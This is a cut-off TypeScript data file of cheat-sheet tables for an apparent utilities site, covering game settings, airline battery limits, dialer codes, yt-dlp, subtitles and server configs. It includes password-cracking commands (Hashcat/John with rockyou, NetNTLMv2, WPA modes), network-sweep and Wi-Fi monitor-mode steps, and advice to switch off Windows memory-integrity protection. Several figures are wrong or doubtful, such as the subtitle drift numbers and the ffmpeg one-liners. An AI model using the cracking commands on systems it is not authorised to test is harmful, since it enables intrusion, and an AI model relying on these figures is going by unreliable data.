import React from "react";
import { Sparkles, Table2, Terminal, CheckCircle2 } from "lucide-react";
import type { Tool, ToolCategory } from "@/lib/tools/types";

export const FAST_WIN_TOOL_SLUGS: string[] = [
  "game-server-ping-ff-sensitivity",
  "termux-nethunter-android-pentest-builder",
  "power-bank-mah-wh-flight-limit-calculator",
  "android-ussd-spyware-scanner",
  "yt-dlp-aria2c-media-stream-command-builder",
  "iphone-secret-dialer-codes-finder",
  "hashcat-john-hash-type-identifier",
  "srt-vtt-subtitle-time-shifter-converter",
  "parametric-eq-binaural-beats-audio-studio",
  "3d-mesh-obj-stl-polygon-print-calculator",
  "android-emulator-vtx-ram-fps-optimizer",
  "nginx-apache-caddy-config-generator",
  "video-bitrate-4k-ffmpeg-command-builder",
  "anime-kdrama-binge-filler-watch-time-calculator",
  "e164-phone-formatter-virtual-number-cost-calculator",
  "bluetooth-audio-codec-battery-latency-calculator",
  "local-llm-vram-calculator",
  "android-magisk-kernelsu-play-integrity-auditor",
  "nmap-command-builder",
  "wireguard-vpn-config-split-tunnel-builder",
  "ai-api-token-cost-calculator",
  "cvss-v4-vulnerability-score-calculator",
  "reverse-shell-command-generator",
  "tcp-flag-port-scan-handshake-visualizer",
  "wireshark-tcpdump-filter-builder",
];

interface CheatSheetRow {
  col1: string;
  col2: string;
  col3: string;
  col4: string;
  codeCol?: 1 | 2 | 3 | 4;
}

interface CheatSheetSpec {
  heading: string;
  quickAnswer: string;
  formulaOrSyntax: string;
  benchmarks: [string, string, string];
  headers: [string, string, string, string];
  rows: CheatSheetRow[];
}

const CUSTOM_CHEAT_SHEETS: Record<string, CheatSheetSpec> = {
  "game-server-ping-ff-sensitivity": {
    heading: "2026 Free Fire Sensitivity (OB46+) & Regional Server Ping Benchmark Table",
    quickAnswer:
      "For smooth one-tap headshot drag in Free Fire (2026 scale 0–200), low-RAM phones (2GB–4GB) require higher General sensitivity (185–200) and a smaller fire button (42%–46%) to compensate for 60Hz touch latency, while 120Hz+ flagships perform best at 155–175 General with <45ms regional RTT ping.",
    formulaOrSyntax: "Effective Drag Velocity = (Base Sensitivity × Screen DPI / 411) × (1000 / Touch Polling Hz)",
    benchmarks: [
      "Competitive Ping: < 35ms RTT (0% Packet Loss)",
      "2026 Sens Scale: 0–200 (Updated from legacy 0–100)",
      "Optimal Fire Button: 44%–52% (1080p 20:9 Display)",
    ],
    headers: [
      "Device Tier / RAM Profile",
      "General & Red Dot (0–200)",
      "2x / 4x / Sniper Scope",
      "Fire Button & DPI Sweet Spot",
    ],
    rows: [
      {
        col1: "2GB – 4GB RAM (60Hz Entry)",
        col2: "Gen: 192–200 | Red Dot: 185",
        col3: "2x: 178 / 4x: 170 / AWM: 110",
        col4: "Button: 42%–45% | DPI: 440–480",
        codeCol: 2,
      },
      {
        col1: "6GB – 8GB RAM (90Hz Mid-Range)",
        col2: "Gen: 176–188 | Red Dot: 170",
        col3: "2x: 162 / 4x: 154 / AWM: 100",
        col4: "Button: 46%–49% | DPI: 411–460",
        codeCol: 2,
      },
      {
        col1: "8GB – 12GB RAM (120Hz Flagship)",
        col2: "Gen: 160–174 | Red Dot: 155",
        col3: "2x: 148 / 4x: 140 / AWM: 92",
        col4: "Button: 48%–52% | Default Stock DPI",
        codeCol: 2,
      },
      {
        col1: "144Hz–165Hz Gaming Phone / iPad",
        col2: "Gen: 145–160 | Red Dot: 142",
        col3: "2x: 136 / 4x: 128 / AWM: 85",
        col4: "Button: 50%–55% | 360Hz+ Touch Rate",
        codeCol: 2,
      },
      {
        col1: "PC Emulator (BlueStacks 5 / MSI)",
        col2: "Gen: 88–110 | X: 1.45 / Y: 2.15",
        col3: "2x: 95 / 4x: 88 / AWM: 65",
        col4: "Mouse: 800–1000 DPI | Tweaks: 16450",
        codeCol: 2,
      },
      {
        col1: "High Ping Compensation (> 95ms RTT)",
        col2: "Gen: +8 Boost | Red Dot: +10",
        col3: "Pre-fire Drag +15% Earlier",
        col4: "Use 1.1.1.1 / 8.8.8.8 & 5GHz Wi-Fi",
        codeCol: 4,
      },
    ],
  },

  "termux-nethunter-android-pentest-builder": {
    heading: "2026 Termux & Kali NetHunter Android Pentest CLI Reference Table",
    quickAnswer:
      "On Android 14, 15, and 16, run Termux from GitHub/F-Droid (never legacy Play Store builds), disable Android's Phantom Process Killer via ADB (`settings put global settings_enable_monitor_phantom_procs false`), and use `-sT -Pn` for unrooted Nmap scans or Kali NetHunter Rootless (`nh -r`) for full security auditing.",
    formulaOrSyntax: "pkg update -y && pkg install root-repo x11-repo nmap proot-distro git python -y",
    benchmarks: [
      "Unrooted Scan Flag: nmap -sT -Pn (TCP Connect)",
      "Process Limit Fix: max_phantom_processes 2147483647",
      "NetHunter GUI: KeX VNC localhost:5901",
    ],
    headers: [
      "Audit Task / Environment",
      "Termux / NetHunter CLI Command",
      "Privilege Level",
      "Android 14–16 Compatibility Note",
    ],
    rows: [
      {
        col1: "Bootstrap Storage & Core Repos",
        col2: "termux-setup-storage && pkg update -y && pkg install git python nmap curl -y",
        col3: "Unrooted User",
        col4: "Grants /sdcard symlink & updates bootstrap packages",
        codeCol: 2,
      },
      {
        col1: "Disable Phantom Process Killer (Signal 9)",
        col2: "adb shell \"/system/bin/device_config put activity_manager max_phantom_processes 2147483647\"",
        col3: "ADB / Wireless Debug",
        col4: "Prevents Android 12–16 from killing proot/SSH sessions",
        codeCol: 2,
      },
      {
        col1: "Kali Linux Rootless Proot Container",
        col2: "pkg install proot-distro -y && proot-distro install nethunter && proot-distro login nethunter",
        col3: "Unrooted Proot",
        col4: "Runs full Kali userland without unlocking bootloader",
        codeCol: 2,
      },
      {
        col1: "Unrooted vs Rooted Nmap Port Sweep",
        col2: "nmap -sT -Pn -T4 --top-ports 1000 192.168.1.0/24",
        col3: "Unrooted (-sT) / Root (-sS)",
        col4: "Raw SYN (-sS) & ICMP ping require Magisk/KernelSU su",
        codeCol: 2,
      },
      {
        col1: "NetHunter Chroot & KeX Desktop",
        col2: "nethunter kex passwd && nethunter kex &",
        col3: "Rooted / NetHunter Lite",
        col4: "Connect NetHunter KeX client to 127.0.0.1:5901",
        codeCol: 2,
      },
      {
        col1: "External OTG Wi-Fi Monitor Mode",
        col2: "su -c \"ip link set wlan1 down && iw dev wlan1 set type monitor && ip link set wlan1 up\"",
        col3: "NetHunter Custom Kernel",
        col4: "Requires mac80211 injection patch + RTL8812AU/MT7612U",
        codeCol: 2,
      },
    ],
  },

  "power-bank-mah-wh-flight-limit-calculator": {
    heading: "2026 Power Bank mAh to Watt-Hours (Wh) Airline Cabin Limit Table",
    quickAnswer:
      "Airlines (TSA, FAA, EASA, DGCA) regulate lithium-ion power banks by Watt-hours (Wh), not mAh. Multiply `(mAh × 3.7V) ÷ 1000` to get Wh: power banks up to 100Wh (27,027 mAh at 3.7V) are allowed in carry-on luggage without approval, 100–160Wh require airline approval, and over 160Wh are strictly banned.",
    formulaOrSyntax: "Wh = (mAh × Nominal_Voltage_3.7V) / 1000  |  Real Output mAh = (Wh × 0.85) / Output_Voltage_5V × 1000",
    benchmarks: [
      "Carry-On Unrestricted: ≤ 100 Wh (≤ 27,027 mAh @ 3.7V)",
      "Airline Permit Tier: 100.1 – 160 Wh (Max 2 units)",
      "Checked Baggage: 0 Wh (Strictly Prohibited in Hold)",
    ],
    headers: [
      "Rated Capacity (@ 3.7V Cell)",
      "Energy Rating (Wh)",
      "Usable 5V Output (~85% Eff.)",
      "TSA / FAA / EASA / DGCA Status",
    ],
    rows: [
      {
        col1: "10,000 mAh (Slim Pocket Pack)",
        col2: "37.0 Wh",
        col3: "~6,290 mAh (~1.3 Phone Charges)",
        col4: "Allowed in Carry-On (No Approval Needed)",
        codeCol: 2,
      },
      {
        col1: "20,000 mAh (Travel Standard)",
        col2: "74.0 Wh",
        col3: "~12,580 mAh (~2.6 Phone Charges)",
        col4: "Allowed in Carry-On (No Approval Needed)",
        codeCol: 2,
      },
      {
        col1: "27,000 mAh (Laptop USB-C PD)",
        col2: "99.9 Wh",
        col3: "~16,980 mAh (1 MacBook Air + 1 Phone)",
        col4: "Max Legal Carry-On Limit Without Permit",
        codeCol: 2,
      },
      {
        col1: "30,000 mAh (High-Capacity Brick)",
        col2: "111.0 Wh",
        col3: "~18,870 mAh (~3.9 Phone Charges)",
        col4: "Requires Airline Check-In Counter Approval",
        codeCol: 2,
      },
      {
        col1: "40,000 mAh (Expedition Bank)",
        col2: "148.0 Wh",
        col3: "~25,160 mAh (~5.2 Phone Charges)",
        col4: "Airline Approval Required (Max 2 Per Passenger)",
        codeCol: 2,
      },
      {
        col1: "50,000 mAh+ (Portable Station)",
        col2: "185.0 Wh+",
        col3: "~31,450 mAh+",
        col4: "Prohibited on Passenger Flights (> 160 Wh)",
        codeCol: 2,
      },
    ],
  },

  "android-ussd-spyware-scanner": {
    heading: "2026 Android USSD / MMI Call Forwarding & Spyware Audit Code Table",
    quickAnswer:
      "Dialing `*#21#`, `*#62#`, and `*#67#` queries your mobile carrier's Home Subscriber Server (HSS) to verify whether your voice calls, SMS, or data streams are being silently forwarded. Note that USSD codes only detect carrier-level call/SMS diversion—modern stalkerware requires auditing Android Accessibility Services and Device Admin apps.",
    formulaOrSyntax: "Check All Diversions: *#21#  |  Check Unreachable: *#62#  |  Erase All Forwarding: ##002#",
    benchmarks: [
      "Master Reset Code: ##002# (Clears all GSM diversions)",
      "Hardware Identity: *#06# (IMEI / EID Verification)",
      "Radio Telemetry: *#*#4636#*#* (Usage & Cell Info)",
    ],
    headers: [
      "USSD / MMI Code",
      "Diagnostic Function",
      "Safe Baseline Output",
      "Reset / Remediation Action",
    ],
    rows: [
      {
        col1: "*#21#",
        col2: "Unconditional Call, SMS & Data Forwarding Status",
        col3: "Voice / SMS / Async: Not Forwarded",
        col4: "Dial ##21# or ##002# to clear unauthorized numbers",
        codeCol: 1,
      },
      {
        col1: "*#62#",
        col2: "Diversion When Unreachable / Out of Signal",
        col3: "Not Forwarded (or Official Carrier Voicemail)",
        col4: "Dial ##62# if an unknown external number appears",
        codeCol: 1,
      },
      {
        col1: "*#67# / *#61#",
        col2: "Diversion When Busy (*#67#) or Unanswered (*#61#)",
        col3: "Not Forwarded (or Carrier Voicemail Gateway)",
        col4: "Dial ##67# and ##61# to disable conditional rules",
        codeCol: 1,
      },
      {
        col1: "##002#",
        col2: "Universal GSM Master Forwarding Erasure Switch",
        col3: "Call Forwarding Erasure Was Successful",
        col4: "Instantly wipes all unconditional & conditional rules",
        codeCol: 1,
      },
      {
        col1: "*#*#4636#*#*",
        col2: "Android Hidden Testing, App Usage & Radio Menu",
        col3: "Shows real LTE/NR RSRP & last-launched apps",
        col4: "Audit Usage Statistics for hidden background apps",
        codeCol: 1,
      },
      {
        col1: "*#06#",
        col2: "IMEI-1, IMEI-2 & eSIM EID Hardware Readout",
        col3: "Matches SIM tray & box serial number",
        col4: "Verify eSIM EID hasn't been swapped without consent",
        codeCol: 1,
      },
    ],
  },

  "yt-dlp-aria2c-media-stream-command-builder": {
    heading: "2026 yt-dlp + aria2c Multi-Connection CLI Command Cheat Sheet",
    quickAnswer:
      "Combine `yt-dlp` with `aria2c` using `--downloader aria2c --downloader-args \"aria2c:-x 16 -s 16 -k 1M\"` to split media segments across 16 parallel TCP connections, bypassing single-thread CDN throttling while merging 4K60 VP9/AV1 video and Opus audio via FFmpeg.",
    formulaOrSyntax: "yt-dlp -f \"bv*[height<=2160]+ba/b\" --merge-output-format mp4 --downloader aria2c --downloader-args \"aria2c:-x 16 -s 16 -k 1M\"",
    benchmarks: [
      "Max Aria2c Threads: -x 16 -s 16 -k 1M",
      "Lossless Audio Flag: -x --audio-format flac --audio-quality 0",
      "Rate-Limit Evasion: --sleep-requests 1 --sleep-interval 3",
    ],
    headers: [
      "Download Scenario",
      "Complete yt-dlp + aria2c CLI Command",
      "Target Container",
      "Key Optimization Flag",
    ],
    rows: [
      {
        col1: "4K60 Best Video + Audio (MP4)",
        col2: "yt-dlp -f \"bv*[height<=2160]+ba/b\" --merge-output-format mp4 <URL>",
        col3: "MP4 (H.264/VP9/AV1 + AAC/Opus)",
        col4: "Requires ffmpeg in PATH for stream muxing",
        codeCol: 2,
      },
      {
        col1: "16-Thread Aria2c Turbo Mode",
        col2: "yt-dlp --downloader aria2c --downloader-args \"aria2c:-x 16 -s 16 -k 1M\" <URL>",
        col3: "Native Source Stream",
        col4: "Splits HTTP range requests across 16 sockets",
        codeCol: 2,
      },
      {
        col1: "Studio Audio Extraction (320k MP3)",
        col2: "yt-dlp -x --audio-format mp3 --audio-quality 0 --embed-thumbnail --add-metadata <URL>",
        col3: "MP3 (ID3v2 + Cover Art)",
        col4: "--audio-quality 0 sets highest VBR/320k bitrate",
        codeCol: 2,
      },
      {
        col1: "SponsorBlock Auto-Remove Segments",
        col2: "yt-dlp --sponsorblock-remove sponsor,intro,outro,selfpromo --embed-chapters <URL>",
        col3: "MKV / MP4 (Chapter Marked)",
        col4: "Queries SponsorBlock API & excises ad timestamps",
        codeCol: 2,
      },
      {
        col1: "Authenticated Age/Member Stream",
        col2: "yt-dlp --cookies-from-browser chrome --write-subs --sub-langs \"en.*\" --embed-subs <URL>",
        col3: "MP4/MKV + Soft Subtitles",
        col4: "Reads decrypted session cookies directly from browser",
        codeCol: 2,
      },
      {
        col1: "Playlist Archive (Skip Duplicates)",
        col2: "yt-dlp --download-archive archive.txt -o \"%(playlist_title)s/%(playlist_index)03d - %(title)s.%(ext)s\" <URL>",
        col3: "Indexed Folder Hierarchy",
        col4: "--download-archive prevents re-downloading IDs",
        codeCol: 2,
      },
    ],
  },

  "iphone-secret-dialer-codes-finder": {
    heading: "2026 iPhone Secret Dialer Codes (iOS 18 / iOS 19 MMI & Field Test Table)",
    quickAnswer:
      "On iPhone running iOS 18 or iOS 19, dialing `*3001#12345#*` launches Apple's hidden Field Test Mode to inspect live 5G NR / LTE RSRP signal strength in dBm, band aggregation, and cell tower PCI, while `*#21#` and `##002#` audit and reset carrier call forwarding.",
    formulaOrSyntax: "Field Test: *3001#12345#*  |  Audit Forwarding: *#21#  |  Clear All Diversions: ##002#",
    benchmarks: [
      "Excellent 5G/LTE RSRP: -80 dBm to -90 dBm",
      "Dead-Zone RSRP Threshold: Worse than -115 dBm",
      "Anonymous Outbound Call: #31#<10-digit-number>",
    ],
    headers: [
      "iPhone Dialer Code",
      "Hidden iOS Function / Menu",
      "Key Telemetry / Expected Output",
      "Carrier & iOS Support",
    ],
    rows: [
      {
        col1: "*3001#12345#*",
        col2: "Apple Hidden Field Test Mode Dashboard",
        col3: "5G NR / LTE Band, RSRP (dBm), RSRQ, SINR & Cell PCI",
        col4: "All iPhones (iOS 16 / 17 / 18 / 19)",
        codeCol: 1,
      },
      {
        col1: "*#21#",
        col2: "Unconditional Call, Data & SMS Forwarding Check",
        col3: "Voice / Data / Fax / SMS: Disabled",
        col4: "GSM & VoLTE Carriers Worldwide",
        codeCol: 1,
      },
      {
        col1: "*#61# / *#62# / *#67#",
        col2: "Conditional Forwarding (Unanswered / Unreachable / Busy)",
        col3: "Displays official carrier Voicemail gateway number",
        col4: "GSM / LTE / 5G SA Networks",
        codeCol: 1,
      },
      {
        col1: "##002#",
        col2: "Master Erasure of All iPhone Call Diversions",
        col3: "Setting Erasure Succeeded (All Call Forwarding)",
        col4: "Instant Carrier HSS Reset",
        codeCol: 1,
      },
      {
        col1: "*#06#",
        col2: "Instant IMEI, IMEI2 & eSIM EID Barcode Display",
        col3: "15-digit IMEI + 32-digit eSIM EID barcode",
        col4: "Works Offline Without SIM Card",
        codeCol: 1,
      },
      {
        col1: "*#31# / #31#Number",
        col2: "Caller ID Line Presentation Status & Per-Call Hide",
        col3: "Hides your phone number for the dialed outbound call",
        col4: "Supported by most GSM/VoLTE carriers",
        codeCol: 1,
      },
    ],
  },

  "hashcat-john-hash-type-identifier": {
    heading: "2026 Hashcat (-m) & John the Ripper (--format) Hash Signature Table",
    quickAnswer:
      "Identify cryptographic hashes by inspecting their prefix (`$2b$`, `$6$`, `$argon2id$`), character length (32 hex = MD5/NTLM, 40 hex = SHA1, 64 hex = SHA-256), and delimiter structure, then map directly to Hashcat `-m` mode IDs and John the Ripper `--format` flags.",
    formulaOrSyntax: "hashcat -m <MODE_ID> -a 0 hashes.txt rockyou.txt -O -w 3  |  john --format=<FORMAT> --wordlist=rockyou.txt hashes.txt",
    benchmarks: [
      "32 Hex Characters: MD5 (-m 0) or Windows NTLM (-m 1000)",
      "60 Chars ($2a$/$2b$): bcrypt Blowfish (-m 3200)",
      "Active Directory Kerberos: AS-REP (-m 18200) / TGS (-m 13100)",
    ],
    headers: [
      "Hash Algorithm / Standard",
      "Length & Prefix Signature",
      "Hashcat Mode (-m)",
      "John the Ripper (--format)",
    ],
    rows: [
      {
        col1: "MD5 / Raw-MD5",
        col2: "32 Hex chars (e.g., 5d41402abc4b2a76...)",
        col3: "-m 0",
        col4: "--format=raw-md5",
        codeCol: 3,
      },
      {
        col1: "Windows NTLM (SAM / NTDS.dit)",
        col2: "32 Hex chars (No salt; case-insensitive hex)",
        col3: "-m 1000",
        col4: "--format=nt",
        codeCol: 3,
      },
      {
        col1: "SHA-256 / Raw-SHA256",
        col2: "64 Hex chars (256-bit digest)",
        col3: "-m 1400",
        col4: "--format=raw-sha256",
        codeCol: 3,
      },
      {
        col1: "bcrypt (Blowfish Cost Factor)",
        col2: "60 chars starting with $2a$, $2b$, or $2y$",
        col3: "-m 3200",
        col4: "--format=bcrypt",
        codeCol: 3,
      },
      {
        col1: "NetNTLMv2 (SMB Responder)",
        col2: "user::DOMAIN:ServerChallenge:NTProofStr:Blob",
        col3: "-m 5600",
        col4: "--format=netntlmv2",
        codeCol: 3,
      },
      {
        col1: "WPA2 / WPA3 PMKID + EAPOL",
        col2: "WPA*01* or WPA*02* (hc22000 hashline)",
        col3: "-m 22000",
        col4: "--format=wpapsk-opencl",
        codeCol: 3,
      },
    ],
  },

  "srt-vtt-subtitle-time-shifter-converter": {
    heading: "2026 SRT vs WebVTT Subtitle Timestamp Sync & Framerate Drift Table",
    quickAnswer:
      "Use a constant millisecond offset (`+ms` or `-ms`) when subtitles are uniformly early or late throughout a video, and apply a framerate ratio multiplier (`23.976 / 25 = 0.95904`) when subtitle desynchronization grows progressively worse from the beginning to the end of the film.",
    formulaOrSyntax: "Linear Drift Fix: New_Time = (Old_Time - Anchor_Time) × (Source_FPS / Target_FPS) + Offset_ms",
    benchmarks: [
      "SRT Timestamp Format: HH:MM:SS,mmm (Comma decimal)",
      "WebVTT Timestamp Format: HH:MM:SS.mmm (Dot decimal + WEBVTT header)",
      "PAL to NTSC Ratio: 25.000 / 23.976 = 1.042709x",
    ],
    headers: [
      "Subtitle Desync / Conversion",
      "Symptom or Format Difference",
      "Correction Formula / Rule",
      "FFmpeg / CLI One-Liner",
    ],
    rows: [
      {
        col1: "Subtitles Appear 2.5s Too Early",
        col2: "Text shows before actor speaks (constant gap)",
        col3: "Add +2500 ms (+00:00:02,500) to all cues",
        col4: "ffmpeg -itsoffset 2.5 -i subs.srt -c copy synced.srt",
        codeCol: 4,
      },
      {
        col1: "Subtitles Appear 1.8s Too Late",
        col2: "Actor speaks before text appears (constant gap)",
        col3: "Subtract -1800 ms (-00:00:01,800) from all cues",
        col4: "ffmpeg -itsoffset -1.8 -i subs.srt -c copy synced.srt",
        codeCol: 4,
      },
      {
        col1: "SRT (.srt) to WebVTT (.vtt)",
        col2: "HTML5 <track> requires WEBVTT header & dot ms",
        col3: "Prepend WEBVTT + replace ,mmm with .mmm",
        col4: "ffmpeg -i input.srt output.vtt",
        codeCol: 4,
      },
      {
        col1: "25 fps (PAL) to 23.976 fps (Blu-ray)",
        col2: "Subs drift ~2.5s out of sync every 60 minutes",
        col3: "Multiply timestamps by 1.042709 (25 / 23.976)",
        col4: "Scale Cue_ms × 1.042709376",
        codeCol: 3,
      },
      {
        col1: "23.976 fps to 25 fps (PAL Speedup)",
        col2: "Subs fall progressively behind video dialogue",
        col3: "Multiply timestamps by 0.959040 (23.976 / 25)",
        col4: "Scale Cue_ms × 0.959040000",
        codeCol: 3,
      },
      {
        col1: "Mojibake / Garbled Accents Fix",
        col2: "Latin-1 (ISO-8859-1 / CP1252) opened as UTF-8",
        col3: "Transcode byte stream to UTF-8 without BOM",
        col4: "iconv -f WINDOWS-1252 -t UTF-8 subs.srt > utf8.srt",
        codeCol: 4,
      },
    ],
  },

  "parametric-eq-binaural-beats-audio-studio": {
    heading: "2026 Parametric EQ Frequency Bands, Q-Factor & Binaural Beats Reference",
    quickAnswer:
      "In parametric equalization, cut narrow resonant peaks with a high Q-factor (`Q = 2.5 – 6.0`) and apply broad musical boosts with a low Q-factor (`Q = 0.7 – 1.4`) alongside a negative preamp gain (`-3 dB to -6 dB`) to prevent digital 0 dBFS clipping. For binaural beats, stereo headphones are mandatory so the left and right ear carrier frequencies (`200–400 Hz`) produce the target brainwave difference frequency.",
    formulaOrSyntax: "Binaural Beat (Hz) = |f_Right_Ear - f_Left_Ear|  |  Bandwidth (Octaves) ≈ 1.44 / Q_Factor",
    benchmarks: [
      "Butterworth Shelf Q: 0.7071 (Zero resonance overshoot)",
      "Anti-Clipping Preamp: -1.0 dB per +1.0 dB max boost",
      "Optimal Binaural Carrier: 180 Hz – 432 Hz (Pure Sine)",
    ],
    headers: [
      "Audio Band / Brainwave State",
      "Frequency / Carrier Offset",
      "Filter Type & Q-Factor",
      "Acoustic / Psychoacoustic Impact",
    ],
    rows: [
      {
        col1: "Sub-Bass & Harman Low Shelf",
        col2: "20 Hz – 80 Hz (Corner: 105 Hz)",
        col3: "Low-Shelf | Q = 0.71 | +3.5 dB",
        col4: "Adds visceral sub-bass punch without muddying mids",
        codeCol: 3,
      },
      {
        col1: "Low-Mid Mud & Boxiness Cut",
        col2: "220 Hz – 380 Hz",
        col3: "Peaking | Q = 1.60 | -2.5 dB",
        col4: "Clears congested room boom & closed-back headphone honk",
        codeCol: 3,
      },
      {
        col1: "Ear Canal Pinna Gain (Presence)",
        col2: "2,800 Hz – 3,500 Hz",
        col3: "Peaking | Q = 1.20 | ±2.0 dB",
        col4: "Controls vocal intimacy, snare attack & sibilance",
        codeCol: 3,
      },
      {
        col1: "Delta / Theta Binaural (Sleep & Meditate)",
        col2: "Carrier 200 Hz L / 205 Hz R (5 Hz Beat)",
        col3: "Pure Sine | 1.5 Hz – 7.5 Hz Offset",
        col4: "Promotes deep relaxation, REM sleep & vagal calm",
        codeCol: 2,
      },
      {
        col1: "Alpha / Beta Binaural (Flow & Study)",
        col2: "Carrier 250 Hz L / 262 Hz R (12 Hz Beat)",
        col3: "Pure Sine | 10 Hz – 18 Hz Offset",
        col4: "Sustained reading comprehension & coding focus",
        codeCol: 2,
      },
      {
        col1: "Gamma 40 Hz Binaural (Peak Cognition)",
        col2: "Carrier 400 Hz L / 440 Hz R (40 Hz Beat)",
        col3: "Pure Sine | 40.0 Hz Offset",
        col4: "High-alert working memory & neural synchronization",
        codeCol: 2,
      },
    ],
  },

  "3d-mesh-obj-stl-polygon-print-calculator": {
    heading: "2026 3D Print Filament Density, Spool Length & STL Polygon Reference Table",
    quickAnswer:
      "Calculate 3D print filament weight by multiplying your mesh's effective volume (outer shell volume + infill percentage) by the material density in `g/cm³`: PLA is `1.24 g/cm³`, PETG is `1.27 g/cm³`, and ABS is `1.04 g/cm³`. Keep binary STL files under 250,000 triangles (`0.01 mm` chordal tolerance) to prevent slicer G-code stuttering.",
    formulaOrSyntax: "Weight (g) = Mesh_Volume_cm3 × (Shell_Ratio + Infill_Ratio × (1 - Shell_Ratio)) × Density_g_cm3",
    benchmarks: [
      "1kg PLA Spool (1.75mm): ~335 meters (~806 cm³)",
      "Binary STL Size Formula: 84 bytes + (50 bytes × Triangles)",
      "Functional Strength Sweet Spot: 4 Perimeters + 25% Gyroid Infill",
    ],
    headers: [
      "3D Printing Material",
      "Density (g/cm³)",
      "1kg Spool Length (1.75mm)",
      "Nozzle / Bed Temp & Slicer Note",
    ],
    rows: [
      {
        col1: "PLA / Tough PLA+",
        col2: "1.24 g/cm³",
        col3: "~335 meters",
        col4: "200–215°C / 60°C Bed | 100% Cooling Fan",
        codeCol: 2,
      },
      {
        col1: "PETG (Chemical/UV Resistant)",
        col2: "1.27 g/cm³",
        col3: "~327 meters",
        col4: "235–245°C / 75°C Bed | 30%–50% Fan, Dry <20% RH",
        codeCol: 2,
      },
      {
        col1: "ABS / ASA (High-Temp Enclosure)",
        col2: "1.04 – 1.07 g/cm³",
        col3: "~388 – 400 meters",
        col4: "250–265°C / 105°C Bed | Enclosed Chamber Required",
        codeCol: 2,
      },
      {
        col1: "TPU 95A (Flexible Elastomer)",
        col2: "1.21 g/cm³",
        col3: "~343 meters",
        col4: "220–230°C / 50°C Bed | Direct Drive ≤ 45 mm/s",
        codeCol: 2,
      },
      {
        col1: "PA-CF / PET-CF (Carbon Fiber)",
        col2: "1.15 – 1.30 g/cm³",
        col3: "~320 – 360 meters",
        col4: "275–300°C | Hardened Steel 0.4mm/0.6mm Nozzle",
        codeCol: 2,
      },
      {
        col1: "SLA / MSLA 405nm UV Resin",
        col2: "1.10 – 1.18 g/cm³",
        col3: "~880 mL per 1kg bottle",
        col4: "Hollow to 2.0mm wall + add 2 drain holes + 18% support",
        codeCol: 2,
      },
    ],
  },

  "android-emulator-vtx-ram-fps-optimizer": {
    heading: "2026 Android Emulator (BlueStacks 5 / MSI / LDPlayer 9) VT-x & FPS Matrix",
    quickAnswer:
      "To eliminate micro-stutter and achieve locked 120–240 FPS in Android emulators, enable Intel VT-x or AMD-V (SVM Mode) in BIOS, disable Windows Core Isolation Memory Integrity (VBS) if using custom hypervisors, allocate exactly half your physical CPU cores, and select Vulkan/OpenGL with ASTC hardware texture decoding.",
    formulaOrSyntax: "Optimal vCPU = Physical_Cores / 2 (Max 4–6)  |  Disable Hyper-V Conflict: bcdedit /set hypervisorlaunchtype off",
    benchmarks: [
      "BIOS Prerequisite: Intel VT-x / AMD SVM Mode = Enabled",
      "Frame Pacing Lock: High Frame Rate ON + VSync OFF",
      "Windows Conflict Fix: Disable Memory Integrity (HVCI)",
    ],
    headers: [
      "Host PC Hardware Tier",
      "Emulator vCPU & RAM Cap",
      "Graphics Renderer & ASTC",
      "Target Resolution & FPS Lock",
    ],
    rows: [
      {
        col1: "Entry PC (8GB RAM / 4-Core i3 or Ryzen 3)",
        col2: "2 Cores | 3,072 MB RAM",
        col3: "OpenGL / DirectX | Software ASTC",
        col4: "1280×720 (720p) @ 60 FPS | 160 DPI",
        codeCol: 2,
      },
      {
        col1: "Mid-Range Gaming (16GB RAM / 6-Core + GTX/RTX)",
        col2: "4 Cores | 4,096 MB RAM",
        col3: "Vulkan / OpenGL | Hardware ASTC",
        col4: "1920×1080 (1080p) @ 90–120 FPS | 240 DPI",
        codeCol: 2,
      },
      {
        col1: "Esports Rig (32GB+ RAM / 8+ Core + RTX/RX)",
        col2: "4–6 Cores | 8,192 MB RAM",
        col3: "Vulkan + Dedicated GPU Prefer ON",
        col4: "1920×1080 or 2560×1440 @ 240 FPS | 320 DPI",
        codeCol: 2,
      },
      {
        col1: "Windows 11 Hyper-V / VBS Stutter Fix",
        col2: "bcdedit /set hypervisorlaunchtype off",
        col3: "Turn OFF Core Isolation Memory Integrity",
        col4: "Restores raw ring-0 VT-x / AMD-V access (+35% FPS)",
        codeCol: 2,
      },
      {
        col1: "NVIDIA Control Panel 3D Profile",
        col2: "Power: Prefer Maximum Performance",
        col3: "Low Latency Mode: Ultra | VSync: Off",
        col4: "Apply to HD-Player.exe / dnplayer.exe",
        codeCol: 4,
      },
      {
        col1: "Storage & Pagefile Bottleneck Fix",
        col2: "Install Emulator on NVMe M.2 SSD",
        col3: "System Managed Pagefile on NVMe",
        col4: "Eliminates shader compilation & asset pop-in lag",
        codeCol: 2,
      },
    ],
  },

  "nginx-apache-caddy-config-generator": {
    heading: "2026 Nginx vs Apache vs Caddy v2 Reverse Proxy & Security Directive Table",
    quickAnswer:
      "When deploying production web servers in 2026, enforce TLS 1.3 with HTTP/3 (QUIC `UDP/443`), configure WebSocket upgrade headers for reverse proxies, enable Brotli/Zstd compression, and set `Strict-Transport-Security`, `X-Content-Type-Options: nosniff`, and `Content-Security-Policy` headers at the edge.",
    formulaOrSyntax: "nginx -t && systemctl reload nginx  |  apachectl configtest  |  caddy validate --config /etc/caddy/Caddyfile",
    benchmarks: [
      "Worker Connections: worker_processes auto; worker_connections 4096;",
      "TLS 1.3 0-RTT / HTTP3: listen 443 quic reuseport; add_header Alt-Svc 'h3=\":443\"'",
      "HSTS Preload Header: max-age=63072000; includeSubDomains; preload",
    ],
    headers: [
      "Server Capability",
      "Nginx (nginx.conf)",
      "Apache (httpd.conf / .htaccess)",
      "Caddy v2 (Caddyfile)",
    ],
    rows: [
      {
        col1: "Reverse Proxy + WebSockets",
        col2: "proxy_pass http://127.0.0.1:3000; proxy_set_header Upgrade $http_upgrade;",
        col3: "ProxyPass / http://127.0.0.1:3000/ upgrade=websocket",
        col4: "reverse_proxy 127.0.0.1:3000 (Auto WebSockets)",
        codeCol: 2,
      },
      {
        col1: "TLS 1.3 + HTTP/3 QUIC",
        col2: "listen 443 ssl; listen 443 quic; ssl_protocols TLSv1.2 TLSv1.3;",
        col3: "Protocols h2 http/1.1 | SSLProtocol -all +TLSv1.3",
        col4: "Automatic HTTPS + HTTP/3 enabled by default",
        codeCol: 2,
      },
      {
        col1: "SPA React/Next Static Fallback",
        col2: "try_files $uri $uri/ /index.html;",
        col3: "FallbackResource /index.html",
        col4: "try_files {path} /index.html",
        codeCol: 2,
      },
      {
        col1: "HSTS & Hardening Headers",
        col2: "add_header Strict-Transport-Security \"max-age=63072000\" always;",
